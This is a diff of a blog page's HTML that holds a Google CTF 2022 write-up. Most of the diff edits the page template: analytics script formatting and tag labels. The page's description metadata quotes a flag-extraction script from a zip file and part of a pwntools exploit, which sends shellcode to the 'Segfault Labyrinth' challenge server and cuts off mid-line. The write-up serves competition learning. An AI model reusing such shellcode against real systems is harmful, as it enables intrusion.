@@ -19,6 +19,7 @@ Appnote.txt import struct with open(&#34;dump.zip&#34;, &#34;rb&#34;) as f: data
 <link rel="mask-icon" href="https://blog.imssm99.kr/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://blog.imssm99.kr/ctf/google_ctf_2022/">
 <noscript>
     <style>
         #theme-toggle,
@@ -28,16 +29,25 @@ Appnote.txt import struct with open(&#34;dump.zip&#34;, &#34;rb&#34;) as f: data
 
     </style>
 </noscript>
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-HS7MTQNBY5"></script>
-<script>
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.dataLayer = window.dataLayer || [];
-	function gtag(){dataLayer.push(arguments);}
-	gtag('js', new Date());
-	gtag('config', 'G-HS7MTQNBY5', { 'anonymize_ip': false });
-}
-</script>
+  
+    
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-HS7MTQNBY5"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-HS7MTQNBY5');
+        }
+      </script>
+    
+  
+
 <meta property="og:title" content="Google Capture The Flag 2022 Writeup" />
 <meta property="og:description" content="Team ST4RT, 65th
 Appnote.txt import struct with open(&#34;dump.zip&#34;, &#34;rb&#34;) as f: data = f.read() u16 = lambda x: struct.unpack(&#34;&lt;H&#34;, x)[0] flag = bytearray() eocd = data[0xEEE2:].split(b&#34;PK\x05\x06&#34;) for d in eocd[1:]: offset = u16(d[12:14]) flag.append(data[offset-1]) print(flag) Segfault Labyrinth from pwn import * context.arch = &#34;amd64&#34; #p = process(&#34;./challenge&#34;) p = remote(&#34;segfault-labyrinth.2022.ctfcompetition.com&#34;, 1337) p.recvline() p.sendline(b&#34;0&#34;*8) code = &#34;&#34;&#34; mov rsp, rdi; mov rbp, rdi; add rsp, 0x400; add rbp, 0x400; mov r8, rdi; TASK: xor rbx, rbx; RUN: mov rdi, 2; mov rsi, [r8 &#43; rbx*8]; mov rdx, 0x1; mov rax, 1; syscall; cmp rax, 0xfffffffffffffff2; jne FOUND; inc rbx; cmp rbx, 0x10; jne RUN; FOUND: mov rax, [rsi]; mov r8, rsi; cmp al, 0; je TASK; mov rdx, 0x40; mov rdi, 1; mov rax, 1; syscall; &#34;&#34;&#34; payload = b&#34;&#34; payload &#43;= asm(code) p." />
@@ -302,8 +312,8 @@ Appnote.txt import struct with open(&#34;dump.zip&#34;, &#34;rb&#34;) as f: data
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="https://blog.imssm99.kr/tags/ctf/">ctf</a></li>
-      <li><a href="https://blog.imssm99.kr/tags/writeup/">writeup</a></li>
+      <li><a href="https://blog.imssm99.kr/tags/ctf/">Ctf</a></li>
+      <li><a href="https://blog.imssm99.kr/tags/writeup/">Writeup</a></li>
     </ul>
 <nav class="paginav">
   <a class="prev" href="https://blog.imssm99.kr/ctf/gon_openqual_2022_fall/">
